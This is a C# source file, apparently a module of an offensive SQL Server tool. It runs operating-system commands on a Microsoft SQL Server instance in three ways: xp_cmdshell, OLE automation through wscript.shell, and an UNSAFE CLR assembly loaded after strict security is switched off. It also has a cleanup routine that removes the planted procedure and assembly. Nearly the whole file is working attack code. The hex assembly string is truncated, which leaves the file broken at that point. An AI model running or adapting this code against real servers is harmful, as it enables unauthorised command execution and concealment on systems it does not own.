using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
using MSSQLMultiTool.outputsLib;

namespace MSSQLMultiTool.Modules
{
    class commandExecution
    {
        static void checkArguments(Dictionary<string, string> arguments)
        {
            try
            {
                if (!arguments.ContainsKey("command"))
                {
                    outputs.printError("Missing Command Argument \n");
                    help();
                    Environment.Exit(0);
                }
            }
            catch (Exception e)
            {
                outputs.printError("Missing Command Argument \n");
                help();
                Environment.Exit(0);
            }
        }
        public static void help()
        {
            Console.WriteLine("--module execution\n");
            Console.WriteLine("     Arguments:\n");
            Console.WriteLine("     --instance <SQL Instance to execute commands on>\n");
            Console.WriteLine("     --run <sub module to run>\n");
            Console.WriteLine("         Sub Modules:\n");
            Console.WriteLine("         xp_cmdshell       : Executes XP_CMDSHELL\n");
            Console.WriteLine("         sp_OACreate       : Executes  OpenQuery Command\n");
            Console.WriteLine("         custom_assembly   : Executes  CustomAssembly Command\n");
            Console.WriteLine("         clean_custom_assembly   : Executes  CustomAssembly Command\n");
            Console.WriteLine("     --command    : CMD Command to Execute\n");
        }

        public static String execute_xp_cmdshell(SqlConnection con, String cmd)
        {
            String res = SQLModule.executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
            outputs.printOutput("Enabled 'xp_cmdshell'.");
            res = SQLModule.executeQuery($"EXEC xp_cmdshell '{cmd}'", con);
            outputs.printSuccess($"Executed command! Result: {res}");
            return res;
        }

        public static String execute_sp_OACreate(SqlConnection con, String cmd)
        {
            String res = SQLModule.executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
            outputs.printOutput("Enabled OLE automation procedures.");
            res = SQLModule.executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}';", con);
            outputs.printSuccess($"Executed command!");
            return res;
        }

        public static String execute_customAssembly(SqlConnection con, String cmd)
        {
            String assemblyHex = "
            String res = SQLModule.executeQuery("EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE", con);
            outputs.printOutput("Enabled Options");
            res = SQLModule.executeQuery($"CREATE ASSEMBLY myAssembly FROM {assemblyHex} WITH PERMISSION_SET = UNSAFE;", con);
            outputs.printOutput("Loaded Assembly");
            res = SQLModule.executeQuery("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];", con);
            res = SQLModule.executeQuery($"EXEC cmdExec '{cmd}'", con);
            outputs.printSuccess($"Executed {cmd} successfuly");
            return res;
        }

        public static String clean_custom_assembly(SqlConnection con)
        {
            String res = SQLModule.executeQuery("DROP PROCEDURE cmdExec; DROP ASSEMBLY myAssembly", con);
            outputs.printSuccess("Cleaned Assembly");
            return res;
        }
        static void ExecuteSubModule(Dictionary<string, string> arguments, SqlConnection con)
        {
            try
            {
                if (arguments["run"].Equals("xp_cmdshell"))
                {
                    try
                    {
                        execute_xp_cmdshell(con, arguments["command"]);
                    }
                    catch(Exception e)
                    {
                        outputs.printError(e.Message);
                        Environment.Exit(0);
                    }
                }
                else if (arguments["run"].Equals("sp_OACreate"))
                {
                    try
                    {
                        execute_sp_OACreate(con, arguments["command"]);
                    }
                    catch (Exception e)
                    {
                        outputs.printError(e.Message);
                        Environment.Exit(0);
                    }
                }

                else if (arguments["run"].Equals("custom_assembly"))
                {
                    try
                    {
                        execute_customAssembly(con, arguments["command"]);
                    }
                    catch (Exception e)
                    {
                        outputs.printError(e.Message);
                        Environment.Exit(0);
                    }
                }

                else if (arguments["run"].Equals("clean_custom_assembly"))
                {
                    try
                    {
                        clean_custom_assembly(con);
                    }
                    catch (Exception e)
                    {
                        outputs.printError(e.Message);
                        Environment.Exit(0);
                    }
                }


            }
            catch(Exception e)
            {
                outputs.printError(e.Message);
                Environment.Exit(0);
            }
        }
        public static void run(Dictionary<string, string> arguments, SqlConnection con)
        {
            outputs.printHeader("Loading Command Execution Module");

            checkArguments(arguments);

            ExecuteSubModule(arguments, con);
        }
    }
}
